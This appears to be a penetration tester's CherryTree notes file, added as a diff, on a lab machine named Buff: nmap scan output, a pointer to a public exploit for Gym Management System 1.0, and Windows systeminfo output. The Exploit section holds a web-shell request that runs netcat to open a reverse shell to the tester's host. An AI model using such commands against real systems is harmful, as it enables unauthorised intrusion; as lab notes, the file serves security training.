@@ -1,0 +1,105 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Buff" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601085808.27" ts_lastsave="1601093164.17" unique_id="1">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Enum" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601085817.88" ts_lastsave="1601085839.41" unique_id="2">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601085839.41" ts_lastsave="1601085841.95" unique_id="3">
+				<rich_text>Starting Nmap 7.80 ( </rich_text>
+				<rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+				<rich_text> ) at 2020-09-25 10:50 EDT
+Nmap scan report for 10.10.10.198
+Host is up (0.60s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+|_http-title: mrb3n's Bro Hut
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT       ADDRESS
+1   624.74 ms 10.10.16.1
+2   551.34 ms 10.10.10.198
+
+OS and Service detection performed. Please report any incorrect results at </rich_text>
+				<rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+				<rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 1437.11 seconds
+</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601091960.01" ts_lastsave="1601093124.84" unique_id="4">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="gym manager v1.0" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601091978.22" ts_lastsave="1601098639.9" unique_id="5">
+				<rich_text>On the page </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/contact.php">http://10.10.10.198:8080/contact.php</rich_text>
+				<rich_text> see CMS and version
+
+Google exploit for CMS. Find exploit </rich_text>
+				<rich_text link="webs https://www.exploit-db.com/exploits/48506">https://www.exploit-db.com/exploits/48506</rich_text>
+				<rich_text>
+
+Go it in the terminal
+python 48506.py </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/">http://10.10.10.198:8080/</rich_text>
+				<rich_text>
+
+
+initiate connect to server: 10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe 10.10.16.5 1337 -e cmd.exe</rich_text>
+			</node>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Systeminfo" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601093164.17" ts_lastsave="1601093166.19" unique_id="6">
+		<rich_text>Host Name:                 BUFF
+OS Name:                   Microsoft Windows 10 Enterprise
+OS Version:                10.0.17134 N/A Build 17134
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          shaun
+Registered Organization:   
+Product ID:                00329-10280-00000-AA218
+Original Install Date:     16/06/2020, 15:05:58
+System Boot Time:          26/09/2020, 02:32:53
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19/06/2019
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     4,095 MB
+Available Physical Memory: 2,465 MB
+Virtual Memory: Max Size:  4,799 MB
+Virtual Memory: Available: 2,755 MB
+Virtual Memory: In Use:    2,044 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.198
+                                 [02]: fe80::59a7:777a:b2d:92d3
+                                 [03]: dead:beef::495c:e0a0:6a96:defd
+                                 [04]: dead:beef::59a7:777a:b2d:92d3
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+</rich_text>
+	</node>
+</cherrytree>
